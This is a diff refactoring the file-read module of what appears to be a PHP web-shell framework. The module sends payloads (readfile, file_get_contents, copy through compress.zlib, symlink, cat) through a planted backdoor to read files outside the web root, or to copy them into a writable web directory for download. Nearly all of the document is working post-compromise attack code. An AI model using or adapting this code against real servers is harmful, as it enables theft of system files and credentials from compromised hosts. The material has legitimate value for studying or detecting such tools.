@@ -8,104 +8,89 @@ from core.module import Module, ModuleException
 classname = 'Read'
     
 class Read(Module):
-    '''Read file outside the web root using different tecniquess
+    '''Read file outside the web root using different tecniques
     files.read <path>
     '''
     
+    vectors_order = { 'shell.php' : [ "readfile()", "file_get_contents()", "copy()", "symlink()"], 
+                      'shell.sh'  : [ "cat" ]
+                     }
     
-    php_read_vectors = { "readfile()"       : "readfile('%s');",
-                "file_get_contents()"     : "print(file_get_contents('%s'));"
-                }
-    
-    php_copy_vectors = {
-                    "copy()"       : "@copy('compress.zlib://%s','%s/file.txt') && file_exists('%s/file.txt') && print(1);",
-                    "symlink()"     : "@symlink('%s','%s/file.txt') && file_exists('%s/file.txt') && print(1);"
-                    }
-    
-    shell_read_vectors = {
-                   "system.exec('cat file')" : "cat %s"
-                   }
-                    
+    vectors = { 'shell.php' : { "readfile()"       : "readfile('%s');",
+                                "file_get_contents()"     : "print(file_get_contents('%s'));",
+                                "copy()"       : "@copy('compress.zlib://%s','%s/file.txt') && file_exists('%s/file.txt') && print(1);",
+                                "symlink()"     : "@symlink('%s','%s/file.txt') && file_exists('%s/file.txt') && print(1);"
+                                },
+                'shell.sh' : {
+                                "cat" : "cat %s"
+                                }
+               }
     
     
-    visible = True
-    
-    def __init__(self, moddict, url, password):
+    def __init__(self, modhandler, url, password):
         
-        Module.__init__(self, moddict, url, password)
+        Module.__init__(self, modhandler, url, password)
         
         self.payload = None
+        self.vector = None
         self.interpreter = None
-        
-        moddict.load('system.exec', url, password)
-        
-        
-    def _slack_probe(self, path):
-        
-        self.moddict.load('find.writable', self.url, self.password)
-        self.moddict.load('system.info', self.url, self.password)
-        
-        doc_root = self.moddict['system.info'].run('doc_root')
-        writable_dir = self.moddict['find.writable'].run('first', 'dir', doc_root)
+        self.writable_dir = None
         
         
-        for name, payload in self.php_read_vectors.items():
-                try:
+    def __slack_probe(self, path):
+        
+        doc_root = self.modhandler.load('system.info').run('document_root')
+        writable_dir = self.modhandler.load('find.writable').run('first', 'dir', doc_root)
+        self.writable_dir = writable_dir
+        
+        for interpreter in self.vectors:
+            for vector in self.vectors_order[interpreter]:
+                if interpreter in self.modhandler.loaded_shells:
                     
-                    payload = payload % path
-                    response = self.moddict['php.exec'].run(payload)
+                    payload = self.vectors[interpreter][vector]
+                    
+                    if payload.count( '%s' ) == 1:
+                        payload = payload % path
+                        
+                    if payload.count( '%s' ) == 3:
+                        payload = payload % (path, writable_dir, writable_dir)
+                        
+                    response = self.modhandler.load(interpreter).run(payload)
+                    
                     
                     if response:
+                        
                         self.payload = payload
-                        self.interpreter = 'php.exec'
-                        print "[file.read] File read using method '%s'" % name   
-                        return
-    
-                except:
-                    pass
+                        self.interpreter = interpreter
+                        self.vector = vector
+                        
+                        return self.__print_response(response)
 
-        for name, payload in self.php_copy_vectors.items():
-                try:
-                    
-                    payload = payload % (path, writable_dir, writable_dir)
-                    response = self.moddict['php.exec'].run(payload)
-                    print payload, response
-                    if response:
-                        self.payload = payload
-                        self.interpreter = 'php.exec'
-                        print "[file.read] File copied/linked to '%s/file.txt'. Try to download it via HTTP." % writable_dir
-                        return
-    
-                except:
-                    pass     
+        raise ModuleException("files.read",  "File read probing failed")       
+     
+    def __print_response(self, response):
+
+        if self.vector.startswith('copy') or self.vector.startswith('symlink'):
+            print "[file.read] File copied/linked to '%s/file.txt'. Try to download it via HTTP." % self.writable_dir
+        else:
+            print "[file.read] File read using method '%s'" % (self.vector)
+            
+        return response        
         
-        for name, payload in self.shell_read_vectors.items():
-                try:
-                    
-                    payload = payload % path
-                    response = self.moddict['system.exec'].run(payload)
-                    
-                    if response:
-                        self.payload = payload
-                        self.interpreter = 'system.exec'
-                        print "[file.read] File read using method '%s'" % name   
-                        return
-    
-                except:
-                    pass
-                
-           
-        raise ModuleException("files.read",  "File read failed")
-                
+     
     def run(self, src_path):
         
         if not self.payload or not self.interpreter:
-            self._slack_probe(src_path)
+            return self.__slack_probe(src_path)
+        else:
+            response = self.modhandler.load(self.interpreter).run(self.payload)
             
-        payload = self.payload
-        interpreter = self.interpreter
+            if response:
+                return self.__print_response(response)
 
-        return self.moddict[interpreter].run(payload)
+            raise ModuleException("files.read",  "File read failed")
+        
+        
             
             
         
